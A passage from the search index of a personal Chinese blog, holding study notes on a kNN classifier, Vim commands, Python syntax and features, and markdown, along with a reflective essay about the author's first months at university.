补充说明python中的读入操作","categories":[{"name":"机器学习","slug":"机器学习","permalink":"https://liuyi12138.github.io/categories/机器学习/"}],"tags":[{"name":"机器学习","slug":"机器学习","permalink":"https://liuyi12138.github.io/tags/机器学习/"}]},{"title":"机器学习实战第二章KNN算法(1)","slug":"机器学习实战第二章KNN算法(1)","date":"2018-04-08T09:55:09.000Z","updated":"2021-02-23T06:34:31.925Z","comments":true,"path":"2018/04/08/机器学习实战第二章KNN算法(1)/","link":"","permalink":"https://liuyi12138.github.io/2018/04/08/机器学习实战第二章KNN算法(1)/","excerpt":"最简单kNN算法实现python 代码注释","text":"最简单kNN算法实现python 代码注释 knn.py123456789101112131415161718192021222324from numpy import * #导入科学计算报numpyimport operator #导入运算符模块def createDataSet(): group = array([[1.0,1.1],[1.0,1.0],[0,0],[0,0.1]]) labels = ['A','A','B','B'] return group,labelsdef classify0(inX,dataSet,labels,k): #inX是需要输入的坐标，dateSet是array,labels是标签，k是k个最邻近数据 dataSetSize = dataSet.shape[0] #shape函数见注释(1) diffMat = tile(inX,(dataSetSize,1)) - dataSet #tile函数见注释(2) 此处求得两点坐标差值(矩阵形式) sqDiffMat = diffMat**2 #坐标差值的平方 sqDistances = sqDiffMat.sum(axis = 1) #sum函数见注释(3) 此处得出每一组的坐标差值平方的和 distances = sqDistances**0.5 #开方，得到距离 sortedDistIndicies = distances.argsort() #rgsort函数见注释(4) 此处将元素按照由小到大的顺序返回下标 classCount = &#123;&#125; for i in range(k): voteIlabel = labels[sortedDistIndicies[i]] classCount[voteIlabel] = classCount.get(voteIlabel,0) + 1 #get()函数返回指定键的值，如果值不在字典中返回默认值。这行代码的意思就是算离目标点距离最近的k个点的类别，这个点是哪个类别哪个类别就加1 sortedClassCount = sorted(classCount.iteritems(),key=operator.itemgetter(1),reverse=True) #sorted见注释(5) items方法是可以将字典中的所有项，以列表方式返回。 key=operator.itemgetter(1)的意思是按照字典里的第一个排序， &#123;A:1,B:2&#125;,要按照第1个（AB是第0个），即‘1’‘2’排序。reverse=True是降序排序 return sortedClassCount[0][0] #返回类别最多的类别 注释部分1.shape函数shape函数是numpy.core.fromnumeric中的函数，它的功能是查看矩阵或者数组的维数。1234567&gt;&gt;&gt; e = eye(3)&gt;&gt;&gt; earray([[ 1., 0., 0.], [ 0., 1., 0.], [ 0., 0., 1.]])&gt;&gt;&gt; e.shape(3, 3) 2.tile函数tile函数也是numpy中的函数，用来重复矩阵1234567891011121314151617&gt;&gt;&gt; import numpy&gt;&gt;&gt; numpy.tile([0,0],5)#在列方向上重复[0,0]5次，默认行1次array([0, 0, 0, 0, 0, 0, 0, 0, 0, 0])&gt;&gt;&gt; numpy.tile([0,0],(1,1))#在列方向上重复[0,0]1次，行1次array([[0, 0]])&gt;&gt;&gt; numpy.tile([0,0],(2,1))#在列方向上重复[0,0]1次，行2次array([[0, 0], [0, 0]])&gt;&gt;&gt; numpy.tile([0,0],(3,1))array([[0, 0], [0, 0], [0, 0]])&gt;&gt;&gt; numpy.tile([0,0],(1,3))#在列方向上重复[0,0]3次，行1次array([[0, 0, 0, 0, 0, 0]])&gt;&gt;&gt; numpy.tile([0,0],(2,3))#在列方向上重复[0,0]3次，行2次array([[0, 0, 0, 0, 0, 0], [0, 0, 0, 0, 0, 0]]) 3.sum函数numpy中的sum与python本身的sum多了一个参数axis,axis＝0表示按列相加，axis＝1表示按照行的方向相加12345678910111213141516&gt;&gt;&gt; import numpy as np&gt;&gt;&gt; a=np.sum([[0,1,2],[2,1,3]])&gt;&gt;&gt; a9&gt;&gt;&gt; a.shape()&gt;&gt;&gt; a=np.sum([[0,1,2],[2,1,3]],axis=0)&gt;&gt;&gt; aarray([2, 2, 5])&gt;&gt;&gt; a.shape(3,)&gt;&gt;&gt; a=np.sum([[0,1,2],[2,1,3]],axis=1)&gt;&gt;&gt; aarray([3, 6])&gt;&gt;&gt; a.shape(2,) 4.argsort函数numpy中的argsort函数将元素按照由小到大的顺序返回下标1234567891011121314151617181920 One dimensional array:一维数组 &gt;&gt;&gt; x = np.array([3, 1, 2]) &gt;&gt;&gt; np.argsort(x) array([1, 2, 0])Two-dimensional array:二维数组 &gt;&gt;&gt; x = np.array([[0, 3], [2, 2]]) &gt;&gt;&gt; x array([[0, 3], [2, 2]]) &gt;&gt;&gt; np.argsort(x, axis=0) #按列排序 array([[0, 1], [1, 0]]) &gt;&gt;&gt; np.argsort(x, axis=1) #按行排序 array([[0, 1], [0, 1]]) 5.sorted函数sortedClassCount = sorted(classCount.iteritems(),key=operator.itemgetter(1),reverse=True) iterable：是可迭代类型;cmp：用于比较的函数，比较什么由key决定;key：用列表元素的某个属性或函数进行作为关键字，有默认值，迭代集合中的一项;reverse：排序规则. reverse = True 降序 或者 reverse = False 升序，有默认值。返回值：是一个经过排序的可迭代类型，与iterable一样。 错误解决sortedClassCount = sorted(classCount.iteritems(),key=operator.itemgetter(1),reverse=True)在看机器学习实战的时候 KNN.py的时候会出现报错’dict’ object has no attribute ‘iteritems’ 解决方法：Python3.5中：iteritems变为items 补充说明python中的常用排序python字典的get函数和iteritems函数","categories":[{"name":"机器学习","slug":"机器学习","permalink":"https://liuyi12138.github.io/categories/机器学习/"}],"tags":[{"name":"机器学习","slug":"机器学习","permalink":"https://liuyi12138.github.io/tags/机器学习/"}]},{"title":"从现在出发","slug":"从现在出发","date":"2018-04-08T09:54:37.000Z","updated":"2021-02-23T06:34:31.925Z","comments":true,"path":"2018/04/08/从现在出发/","link":"","permalink":"https://liuyi12138.github.io/2018/04/08/从现在出发/","excerpt":"扳指一算，我来到大学已经有三个多月了，一直想写这样一篇文章，来祭奠那逝去的日子以及纪念这新的开始。但苦于刚入大学，事务繁忙，不懂的又太多，总想着能尽可能多学一点，做更好一点的自己，所以一直没有花时间去好好地品味，去揣摩发生在我身边的林林总总。今天依旧是一个忙碌的日子，但好不容易能静下心来，在这寂静的夜里，听着轻柔的歌声，记忆渐渐从脑海里浮现…… **","text":"扳指一算，我来到大学已经有三个多月了，一直想写这样一篇文章，来祭奠那逝去的日子以及纪念这新的开始。但苦于刚入大学，事务繁忙，不懂的又太多，总想着能尽可能多学一点，做更好一点的自己，所以一直没有花时间去好好地品味，去揣摩发生在我身边的林林总总。今天依旧是一个忙碌的日子，但好不容易能静下心来，在这寂静的夜里，听着轻柔的歌声，记忆渐渐从脑海里浮现…… ** 关于“知君” 知君这个名字，不知用了多久，不仅是博客，似乎在我登录所有的账户时，都不由自主地使用了它，仔细回想，兴许是因为一篇文，兴许是因为一首词，兴许，是因为一段往事… “知君仙骨无寒暑，千载相逢尤旦暮” 这一句词出于苏轼的《木兰花令·次马中玉韵》，为苏东坡的和词。马瑊为杭州浙漕时，为苏轼送行的席间应景而作一词，主要是赞咏东坡知任杭州期间遗爱感人之深，以致临别之刻，杭州百姓洒泪多於江上雨，而苏轼当场也用了相同的词牌，作了一阙语意浅易，然禅意深远的词应和之。 初见此词，便只觉心头一震，如江南所说，仿佛什么东西扑面而来。眼前本来混混沌沌的烟水里忽然浮起一人的眉目，一瞬间的凝视，而后消散，只剩看的人去畅想。好诗好词应该就是这样，沉珠璞玉，寂静在匣子里，大音希声。它要等你去听他的低语。每每品这阙词，总要拿纳兰的木兰花令来作对比，总觉得一首惜别，一首伤情，应了人间的是是非非。 记得当年还特意写过一篇文章来品这首词，至今大多数话语都已记不得了，唯有一句，永远记在心底。高适在《别董大》里写到“莫愁前路无知己，天下谁人不识君。”而我常常在想，我们行走于世间，更多的不过是做别人生活中的一个过客，说到底，谁人知君，唯君己矣。 从前总是希望有人来了解自己，现在更期望着自己能了解别人。 关于现在的生活 来大学以前，我无数次憧憬过这生活该是怎样的多姿多彩，但自从来到了这里，似乎一切又变得不一样了。高中的时候，每天中午趴在桌上看半个小时书，总觉得意犹未尽，但到如今，似乎时间是多了起来，但越来越没有耐心静下心好好看上一两篇好文章，甚至不再打球，到如今，有了资本，却不再想做当年拼着命也想去做的事。 我常想自己是怎么了，为什么把生活过成这个样子？我不明白，似乎来到了这里，我就不是当年的我了，也许是我成熟了，也许是我堕落了。这两者本身就没有太大差别，被生活的方方面面浸染，柴米油盐，把一个个天才都变成了凡夫俗子。 但我想，我还在反省，说明我还拼着命想守护那一片净土。想想现在的生活，每天都在学着很多，又丢掉了很多，或许我能有一个更辉煌的未来，或许我会丢失最纯真的自我。 我不知道，不知道未来是什么样子，但我知道，我还在反抗，人之所以活在这世上，或许是不想被命运践踏在脚下。以此自勉。 关于爱情 爱情总是个亘古不变的话题，千百年来，被人传唱，也被人唾弃。不知道是该说是幸运还是不幸，在大学里，遇到了一个我爱的人，而她恰好也爱着我。我常在憧憬着爱情，可当它到来的时候，又仿佛是那么的寻常，一个午后，一个转身，那个人就这样走进了我的生命。说到底，我还是不懂爱情，它太奇妙，也太直白，但我总想小心翼翼地维护着它，渐渐地，它也成为我生活的一部分，我爱着生活里最甜蜜的这一部分。 写了很久，却也没写多少，事实上，很多东西从脑海里构思到写出来，已然是面目全非。但这依旧是我最想写的那一部分，记录下我的现状，我想从现在出发，拥有一个更好的生活，做一个更好的我。","categories":[{"name":"文学","slug":"文学","permalink":"https://liuyi12138.github.io/categories/文学/"}],"tags":[{"name":"立志","slug":"立志","permalink":"https://liuyi12138.github.io/tags/立志/"}]},{"title":"Vim学习笔记","slug":"Vim学习笔记","date":"2018-04-08T09:54:11.000Z","updated":"2021-02-23T06:34:31.910Z","comments":true,"path":"2018/04/08/Vim学习笔记/","link":"","permalink":"https://liuyi12138.github.io/2018/04/08/Vim学习笔记/","excerpt":"Vim 常规操作总结","text":"Vim 常规操作总结 第一讲小结 光标在屏幕文本中的移动既可以用箭头键，也可以使用 hjkl 字母键。 1h (左移) j (下行) k (上行) l (右移) 欲进入 Vim 编辑器(从命令行提示符)，请输入：vim 文件名 &lt;回车&gt; 欲退出 Vim 编辑器，请输入 12 &lt;ESC&gt; :q! &lt;回车&gt; 放弃所有改动。或者输入 &lt;ESC&gt; :wq &lt;回车&gt; 保存改动。 在正常模式下删除光标所在位置的字符，请按： x 欲插入或添加文本，请输入： 12i 输入欲插入文本 &lt;ESC&gt; 在光标前插入文本A 输入欲添加文本 &lt;ESC&gt; 在一行后添加文本 特别提示：按下 键会带您回到正常模式或者撤消一个不想输入或部分完整的命令。 第二讲小结 欲从当前光标删除至下一个单词，请输入：dw 欲从当前光标删除至当前行末尾，请输入：d$ 欲删除整行，请输入：dd 欲重复一个动作，请在它前面加上一个数字：2w 在正常模式下修改命令的格式是： 123456 operator [number] motion其中： operator - 操作符，代表要做的事情，比如 d 代表删除 [number] - 可以附加的数字，代表动作重复的次数 motion - 动作，代表在所操作的文本上的移动，例如 w 代表单词(word)， $ 代表行末等等。 欲移动光标到行首，请按数字0键：0 欲撤消以前的操作，请输入：u (小写的u)欲撤消在一行中所做的改动，请输入：U (大写的U)欲撤消以前的撤消命令，恢复以前的操作结果，请输入：CTRL-R 第三讲小结 要重新置入已经删除的文本内容，请按小写字母 p 键。该操作可以将已删除的文本内容置于光标之后。如果最后一次删除的是一个整行，那么该行将置于当前光标所在行的下一行。 要替换光标所在位置的字符，请输入小写的 r 和要替换掉原位置字符的新字符即可。 更改类命令允许您改变从当前光标所在位置直到动作指示的位置中间的文本。比如输入 ce 可以替换当前光标到单词的末尾的内容；输入 c$ 可以替换当前光标到行末的内容。 更改类命令的格式是： 1c [number] motion 第四讲小结 CTRL-G 用于显示当前光标所在位置和文件状态信息。G 用于将光标跳转至文件最后一行。先敲入一个行号然后输入大写 G 则是将光标移动至该行号代表的行。gg 用于将光标跳转至文件第一行。 输入 / 然后紧随一个字符串是在当前所编辑的文档中正向查找该字符串。输入 ? 然后紧随一个字符串则是在当前所编辑的文档中反向查找该字符串。完成一次查找之后按 n 键是重复上一次的命令，可在同一方向上查找下一个匹配字符串所在；或者按大写 N 向相反方向查找下一匹配字符串所在。CTRL-O 带您跳转回较旧的位置，CTRL-I 则带您到较新的位置。 如果光标当前位置是括号(、)、[、]、{、}，按 % 会将光标移动到配对的括号上。 在一行内替换头一个字符串 old 为新的字符串 new，请输入 :s/old/new在一行内替换所有的字符串 old 为新的字符串 new，请输入 :s/old/new/g在两行内替换所有的字符串 old 为新的字符串 new，请输入 :#,#s/old/new/g在文件内替换所有的字符串 old 为新的字符串 new，请输入 :%s/old/new/g进行全文替换时询问用户确认每个替换需添加 c 标志 :%s/old/new/gc 第五讲小结 :!command 用于执行一个外部命令 command。 请看一些实际例子： 123(MS-DOS) (Unix) :!dir :!ls - 用于显示当前目录的内容。 :!del FILENAME :!rm FILENAME - 用于删除名为 FILENAME 的文件。 :w FILENAME 可将当前 VIM 中正在编辑的文件保存到名为 FILENAME 的文件中。 v motion :w FILENAME 可将当前编辑文件中可视模式下选中的内容保存到文件FILENAME 中。 :r FILENAME 可提取磁盘文件 FILENAME 并将其插入到当前文件的光标位置后面。 :r !dir 可以读取 dir 命令的输出并将其放置到当前文件的光标位置后面。 第六讲小结 输入小写的 o 可以在光标下方打开新的一行并进入插入模式。输入大写的 O 可以在光标上方打开新的一行。 输入小写的 a 可以在光标所在位置之后插入文本。输入大写的 A 可以在光标所在行的行末之后插入文本。 e 命令可以使光标移动到单词末尾。 操作符 y 复制文本，p 粘贴先前复制的文本。 输入大写的 R 将进入替换模式，直至按 键回到正常模式。 输入 :set xxx 可以设置 xxx 选项。一些有用的选项如下： 1234 &apos;ic&apos; &apos;ignorecase&apos; 查找时忽略字母大小写 &apos;is&apos; &apos;incsearch&apos; 查找短语时显示部分匹配 &apos;hls&apos; &apos;hlsearch&apos; 高亮显示所有的匹配短语选项名可以用完整版本，也可以用缩略版本。 在选项前加上 no 可以关闭选项： :set noic 第七讲小结 输入 :help 或者按 键或 键可以打开帮助窗口。 输入 :help cmd 可以找到关于 cmd 命令的帮助。 输入 CTRL-W CTRL-W 可以使您在窗口之间跳转。 输入 :q 以关闭帮助窗口 您可以创建一个 vimrc 启动脚本文件用来保存您偏好的设置。 当输入 : 命令时，按 CTRL-D 可以查看可能的补全结果。按 可以使用一个补全。","categories":[{"name":"工具使用","slug":"工具使用","permalink":"https://liuyi12138.github.io/categories/工具使用/"}],"tags":[{"name":"Vim","slug":"Vim","permalink":"https://liuyi12138.github.io/tags/Vim/"}]},{"title":"Python学习笔记5--面向对象编程","slug":"Python学习笔记5--面向对象编程","date":"2018-04-08T09:53:26.000Z","updated":"2021-02-23T06:34:31.910Z","comments":true,"path":"2018/04/08/Python学习笔记5--面向对象编程/","link":"","permalink":"https://liuyi12138.github.io/2018/04/08/Python学习笔记5--面向对象编程/","excerpt":"python与javascript的比较学习面向对象编程(OOP)","text":"python与javascript的比较学习面向对象编程(OOP) 类和实例 class Student(object): －Student是类名，object表示该类是从哪个类继承下来的(如果没有合适的继承类，就使用object类，这是所有类最终都会继承的类) 通过定义__init__方法绑定属性(创建实例的时不能传入空的参数必须传入与__init__方法匹配的参数,但self不需要传) 12345class Student(object): def __init__(self, name, score): self.name = name self.score = score 访问限制 实例的变量名如果以__开头，就变成了一个私有变量,，只有内部可以访问，外部不能访问 Python解释器对外把__name变量改成了_Student__name，所以，仍然可以通过_Student__name来访问__name变量 继承和多态 子类获得了父类的全部功能 当子类和父类存在相同的方法时，子类的方法覆盖父类的方法 多态对扩展开放，对修改封闭 获取对象信息 可以使用isinstance()函数判断class类型 如果要获得一个对象的所有属性和方法，可以使用dir()函数，它返回一个包含字符串的list 测试该对象的属性123456789101112131415&gt;&gt;&gt; hasattr(obj, 'x') # 有属性'x'吗？True&gt;&gt;&gt; obj.x9&gt;&gt;&gt; hasattr(obj, 'y') # 有属性'y'吗？False&gt;&gt;&gt; setattr(obj, 'y', 19) # 设置一个属性'y'&gt;&gt;&gt; hasattr(obj, 'y') # 有属性'y'吗？True&gt;&gt;&gt; getattr(obj, 'y') # 获取属性'y'19&gt;&gt;&gt; obj.y # 获取属性'y'19&gt;&gt;&gt; getattr(obj, 'z', 404) # 获取属性'z'，如果不存在，返回默认值404404","categories":[{"name":"编程语言","slug":"编程语言","permalink":"https://liuyi12138.github.io/categories/编程语言/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://liuyi12138.github.io/tags/Python/"}]},{"title":"Python学习笔记4--函数式编程","slug":"Python学习笔记4--函数式编程","date":"2018-04-08T09:53:02.000Z","updated":"2021-02-23T06:34:31.910Z","comments":true,"path":"2018/04/08/Python学习笔记4--函数式编程/","link":"","permalink":"https://liuyi12138.github.io/2018/04/08/Python学习笔记4--函数式编程/","excerpt":"python与javascript的比较学习函数式编程","text":"python与javascript的比较学习函数式编程 感觉基本和JavaScript的高阶函数一样，吓得我赶紧复习了一遍js复习传送门 高阶函数 收回我刚刚的话，py和js的高阶函数只是看起来一样，其实区别贼大 map js中map的用法 － r=arr.map(function) 得到一个新的arr py中map的用法 － r=map(f,list) 得到一个Iterator list(map(str, [1, 2, 3, 4, 5, 6, 7, 8, 9])) －因此在py中用list()函数让它把整个序列都计算出来并返回一个list js里方法较多，py里函数较多 如果在py里像js一样使用map结果是’list’ object has no attribute ‘map’即py中list没有map方法，当然其他数据结构也没有，亲测 reduce js中reduce的用法 －arr.reduce(function (x, y)) py中reduce的用法 －reduce(fn, [1, 3, 5, 7, 9]) 完整用法123456&gt;&gt;&gt; from functools import reduce&gt;&gt;&gt; def add(x, y):... return x + y...&gt;&gt;&gt; reduce(add, [1, 3, 5, 7, 9])25 filter filter()函数返回的是一个Iterator，也就是一个惰性序列，所以要强迫filter()完成计算结果，需要用list()函数获得所有结果并返回list 1234def is_odd(n): return n % 2 == 1list(filter(is_odd, [1, 2, 4, 5, 6, 9, 10, 15])) sort Python内置的sorted()函数就可以对list进行排序 sorted()函数也是一个高阶函数，它还可以接收一个key函数来实现自定义的排序 sorted([36, 5, -12, 9, -21], key=abs) －按绝对值大小排序 py貌似没有js的那种sort()方法默认把所有元素先转换为String再排序的问题 要进行反向排序，不必改动key函数，可以传入第三个参数reverse=True 返回函数 py中返回函数或等于js中的闭包 返回闭包时牢记一点：返回函数不要引用任何循环变量，或者后续会发生变化的变量 js中的闭包 匿名函数 list(map(lambda x: x * x, [1, 2, 3, 4, 5, 6, 7, 8, 9])) 匿名函数只能有一个表达式，只能返回该表达式的结果 可以把匿名函数赋值给一个变量 也可以把匿名函数作为返回值 装饰器 在代码运行期间动态增加功能的方式，称之为“装饰器”（Decorator） decorator接受一个函数并返回一个函数 @functools.wraps(func) －将原始函数(func)的属性赋给新的函数 1f.__name__ //函数对象有一个__name__属性，可以拿到函数的名字(\"__\"是两个\"_\") Python time time() 返回当前时间的时间戳 12345678910import functools //import functools是导入functools模块def log(text): def decorator(func): @functools.wraps(func) def wrapper(*args, **kw): print('%s %s():' % (text, func.__name__)) return func(*args, **kw) return wrapper return decorator 偏函数 functools.partial的作用就是，把一个函数的某些参数给固定住（也就是设置默认值），返回一个新的函数，调用这个新函数会更简单 int2 = functools.partial(int, base=2) －把int函数的base参数(做N进制的转换)固定为２(相当于加入kw = { ‘base’: 2 })创建偏函数时，实际上可以接收函数对象、*args和**kw这3个参数 max2 = functools.partial(max, 10) －10会作为*args的一部分自动加到左边","categories":[{"name":"编程语言","slug":"编程语言","permalink":"https://liuyi12138.github.io/categories/编程语言/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://liuyi12138.github.io/tags/Python/"}]},{"title":"Python学习笔记3--高级特性","slug":"Python学习笔记3--高级特性","date":"2018-04-08T09:52:33.000Z","updated":"2021-02-23T06:34:31.910Z","comments":true,"path":"2018/04/08/Python学习笔记3--高级特性/","link":"","permalink":"https://liuyi12138.github.io/2018/04/08/Python学习笔记3--高级特性/","excerpt":"python与c的比较学习高级特性","text":"python与c的比较学习高级特性 切片(slice) L[a:b:c] －取list中的索引a-(b-1)的元素,索引一次增加c(一共b-a个元素)(c可以省略)(c可以为负数哦) 如果第一个索引为0，可以省略 甚至支持倒切片，倒数第一个元素索引为-1，(此时b可以省略) 甚至什么都不写，只写[:]就可以原样复制一个list tuple切片仍然是tuple,字符串切片仍然是字符串 迭代 默认情况下，dict迭代的是key 要迭代value，可以用for value in d.values() 要同时迭代key和value，可以用for k, v in d.items() 列表生成器(List Comprehensions) list(range(1, 11)) －前面见过的哦，文章底部 列表生成式 12345[x * x for x in range(1, 11)][x * x for x in range(1, 11) if x % 2 == 0][m + n for m in 'ABC' for n in 'XYZ'][k + '=' + v for k, v in d.items()][s.lower() for s in L] 列出当前目录下的所有文件和目录名 12&gt;&gt;&gt; import os # 导入os模块，模块的概念后面讲到&gt;&gt;&gt; [d for d in os.listdir('.')] # os.listdir可以列出文件和目录 生成器(generator) 创建一个generator 把一个列表生成式的[]改成() g = (x * x for x in range(10)) 可以通过next()函数获得generator的下一个返回值，更多的时候用for循环 123g = (x * x for x in range(10))for n in g: print(n) 斐波拉契数列生成器 1234567def fib(max): n, a, b = 0, 0, 1 while n &lt; max: yield b a, b = b, a + b n = n + 1 return 'done' 杨辉三角生成器变成generator的函数，在每次调用next()的时候执行，遇到yield语句返回，再次执行时从上次返回的yield语句处继续执行 用for循环调用generator时拿不到generator的return语句的返回值,如果想要拿到返回值，必须捕获StopIteration错误，返回值包含在StopIteration的value中 迭代器 可以直接作用于for循环的对象统称为可迭代对象：Iterable 集合数据类型:list,tuple,dict,set,str…(int不是interable) generator:生成器，带yield的generator function isinstance([], Iterable) －可以使用isinstance()判断一个对象是否是Iterable对象 Python的for循环本质上就是通过不断调用next()函数实现的，例如： 可以被next()函数调用并不断返回下一个值的对象称为迭代器：Iterator isinstance((x for x in range(10)), Iterator) 注意Interanle和Interator,前者是可迭代对象，后者是迭代器 把list、dict、str等Iterable变成Iterator可以使用iter()函数 Python的Iterator对象表示的是一个数据流，它的计算是惰性的，只有在需要返回下一个数据时它才会计算，甚至它可以表示一个无限大的数据流","categories":[{"name":"编程语言","slug":"编程语言","permalink":"https://liuyi12138.github.io/categories/编程语言/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://liuyi12138.github.io/tags/Python/"}]},{"title":"Python学习笔记2--函数","slug":"Python学习笔记2--函数","date":"2018-04-08T09:51:26.000Z","updated":"2021-02-23T06:34:31.910Z","comments":true,"path":"2018/04/08/Python学习笔记2--函数/","link":"","permalink":"https://liuyi12138.github.io/2018/04/08/Python学习笔记2--函数/","excerpt":"python与c的比较学习函数你们要的函数库 或者用help(abs)查看函数信息","text":"python与c的比较学习函数你们要的函数库 或者用help(abs)查看函数信息 定义函数 def function(x):… －定义一个函数 from (文件名，不含.py) import function －从本地导入函数 定义一个空函数 12def nop(): pass pass可以用来作为占位符 12if age &gt;= 18: pass 数据类型检查可以用内置函数isinstance()实现： 1234567def my_abs(x): if not isinstance(x, (int, float)): raise TypeError('bad operand type') if x &gt;= 0: return x else: return -x 函数可以同时返回多个值，但其实就是一个tuple 函数参数 默认参数 123456def power(x, n=2): s = 1 while n &gt; 0: n = n - 1 s = s * x return s 定义默认参数要牢记一点：默认参数必须指向不变对象,不能有[ ],可以这样操作一波 12345def add_end(L=None): if L is None: L = [] L.append('END') return L 可变参数(参数numbers接收到的是一个tuple) 12345def calc(*numbers): sum = 0 for n in numbers: sum = sum + n * n return sum 关键字参数(关键字参数在函数内部自动组装为一个dict) 123def person(name, age, **kw): print('name:', name, 'age:', age, 'other:', kw)name: Jack age: 24 other: &#123;'city': 'Beijing', 'job': 'Engineer'&#125; kw获得的dict是一份拷贝，对函数外的kw没有影响 命名关键字参数 －限制关键字参数的名字12def person(name, age, *, city, job): print(name, age, city, job) 参数组合（必选参数、默认参数、可变参数、关键字参数和命名关键字参数）12345def f1(a, b, c=0, *args, **kw): print('a =', a, 'b =', b, 'c =', c, 'args =', args, 'kw =', kw)def f2(a, b, c=0, *, d, **kw): print('a =', a, 'b =', b, 'c =', c, 'd =', d, 'kw =', kw) 对于任意函数，都可以通过类似func(*args,**kw)的形式调用它，无论它的参数是如何定义的 *args是可变参数，args接收的是一个tuple； **kw是关键字参数，kw接收的是一个dict。 递归函数 使用递归函数需要注意防止栈溢出，下面的函数n最大为998,亲测 1234def fact(n): if n==1: return 1 return n * fact(n - 1) 尾递归，在函数返回的时候，调用自身本身 1234567def fact(n): return fact_iter(n, 1)def fact_iter(num, product): if num == 1: return product return fact_iter(num - 1, num * product) 尾递归调用时，如果做了优化，栈不会增长，因此，无论多少次调用也不会导致栈溢出。 大多数编程语言没有针对尾递归做优化，Python解释器也没有做优化，所以，即使把上面的fact(n)函数改成尾递归方式，也会导致栈溢出。 综上，尾递归这一节说的都是屁话 递归实现汉罗塔 感觉有一点动态规划的感觉","categories":[{"name":"编程语言","slug":"编程语言","permalink":"https://liuyi12138.github.io/categories/编程语言/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://liuyi12138.github.io/tags/Python/"}]},{"title":"Python学习笔记１--基本语法","slug":"Python学习笔记１--基本语法","date":"2018-04-07T07:54:01.000Z","updated":"2021-02-23T06:34:31.910Z","comments":true,"path":"2018/04/07/Python学习笔记１--基本语法/","link":"","permalink":"https://liuyi12138.github.io/2018/04/07/Python学习笔记１--基本语法/","excerpt":"python与c的比较学习python没有分号！！！ True的”T”要大写 基本语法","text":"python与c的比较学习python没有分号！！！ True的”T”要大写 基本语法 数据类型和变量 Python允许用’’’…’’’的格式表示多行内容 /除法计算结果是浮点数，即使是两个整数恰好整除，结果也是浮点数 还有一种除法是//，称为地板除，两个整数的除法仍然是整数： ‘Hello, %s’ % ‘world’(比c语言多一个%)(或者用format) ‘Hello, {0}, 成绩提升了 {1:.1f}%’.format(‘小明’, 17.125) 文件开头写上这两行：12#!/usr/bin/env python3# -*- coding: utf-8 -*- 特殊数据结构list (类似于数组但元素的数据类型也可以不同) list可以以负数为索引，从尾到头搜索 classmates.append(‘Adam’) －往list中追加元素到末尾 classmates.insert(1, ‘Jack’) －把元素插入到指定的位置(从0开始) classmates.pop() －删除list末尾的元素 classmates.pop(i) －删除指定位置元素(从0开始) turple(元组，一旦初始化就不能修改) t = (1) －定义1这个数 t = (1,) －定义一个只含1这个元素的turple t = (‘a’, ‘b’, [‘A’, ‘B’]) －”可变”的turple这里turple里面有一个list，相当于c语言里一个const int*t[n]，但是t里面的指针可以改变指向.c语言中int *const p为常指针，不能改变指针的指向 dict dict全称dictionary，在其他语言中也称为map(见JavaScript中的Map,不是map 123a = &#123;'Michael': 95, 'Bob': 75, 'Tracy': 85&#125;a['Michael']95 dict内部存放的顺序和key放入的顺序是没有关系的 d.get(‘Thomas’) －get方法 pop(key) －删除一个key dict与list的比较 名称 时间与键值对数目的关系 内存与键值对的关系 dict 查找和插入的速度极快，不会随着key的增加而变慢 需要占用大量的内存，内存浪费多 list 查找和插入的时间随着元素的增加而增加 占用空间小，浪费内存很少 dict的key必须是不可变对象 set set和dict类似，也是一组key的集合，但不存储value。由于key不能重复，所以，在set中，没有重复的key s = set([1, 2, 3]) －创建set add(key) －添加元素到set中 remove(key) －从set中删除元素 两个set可以做数学意义上的交集、并集等操作 s1 &amp; s2 s1 | s2 判断与循环 选择和判断语句后要加引号＂：＂ Python的缩进规则，如果if语句判断是True，就把缩进的n行print语句执行了，否则，什么也不做(不需要括号哦) input()返回的数据类型是str，str不能直接和整数比较，必须先把str转换成整数 123456s = input('birth: ')birth = int(s) //类似于强制转换，但注意在python中int()是一个函数if birth &lt; 2000: print('00前')else: print('00后') range()函数可以生成一个连续的整数数列 list()函数可以将range生成的数列转换为list12list(range(5))[0, 1, 2, 3, 4] Python初感知典型的面向对象编程，感觉和JavaScript十分相似(list像arr,dict像Map,set像Set),感觉十分简洁，规范性弱于C，但是Python和JavaScript的区别暂时还没有看出来,有待日后做专题比较．","categories":[{"name":"编程语言","slug":"编程语言","permalink":"https://liuyi12138.github.io/categories/编程语言/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://liuyi12138.github.io/tags/Python/"}]},{"title":"markdown学习笔记","slug":"markdown学习笔记","date":"2018-04-07T07:53:03.000Z","updated":"2021-02-23T06:34:31.910Z","comments":true,"path":"2018/04/07/markdown学习笔记/","link":"","permalink":"https://liuyi12138.github.io/2018/04/07/markdown学习笔记/","excerpt":"markdown 基本用法","text":"markdown 基本用法 1.标题在 Markdown 中，如果一段文字被定义为标题，只要在这段文字前加 # 号即可。有多少个#即为几级标题。 markdown.1.jpg TIPS : 在Git中 ‘#’ 后需加上空格 2.列表在 Markdown 中，列表的显示只需要在文字前加上 - 或 * 即可变为无序列表，有序列表则直接在文字前加1. 2. 3. 符号要和文字之间加上一个字符的空格。 1. 2. 3 Tips ： ‘-‘和’*‘在同一个无序列表可以混用TIPS ： 空一格风味更佳哦 1. 2. 3. 3.引用在Markdown中，在一段文字前加上’&gt;’即将这一段话定义为引用。 这是一段引用 TIPS ： 注意’&gt;’与文字之间应有空格 4.图片与链接123![我是图片](http://)[我是链接](http://) TIPS ： 插入图片需要图床哦，不要天真得以为加上本地链接就可以了 5.强调可以使用加粗和斜体来格式化文本内容。 123加粗使用: **这种语法**斜体使用: *这种语法* 或 _这种语法_还可以混合使用：**加粗文本中的_斜体_** 6.高亮代码在两组 1234567891011两个 ` 之间被识别为行内代码**TIPS : 在第一组```后面加上某些字符会有特效哦 比如 cpp Python 而且加上markdown是万能的呢**```cpp # include&lt;stdio.h&gt; int main() &#123; printf(&quot;hello,world!); return 0; &#125; 7.表格 Title 1(居中对齐) Title 2 （右对齐） Title 3 （左对齐） Tip 1 1.1 1.2 1.3 Tip 2 1.2 2.2 2.3 Tip 3 1.3 3.2 3.3 TIPS ：你还可以使用 : 指定列的对齐方式。 12345| | Title 1(居中对齐) | Title 2 （右对齐） | Title 3 （左对齐） || ------------- |:-----------------:|-----------------:|:--------------------|| Tip 1 | 1.1 | 1.2 | 1.3 || Tip 2 | 1.2 | 2.2 | 2.3 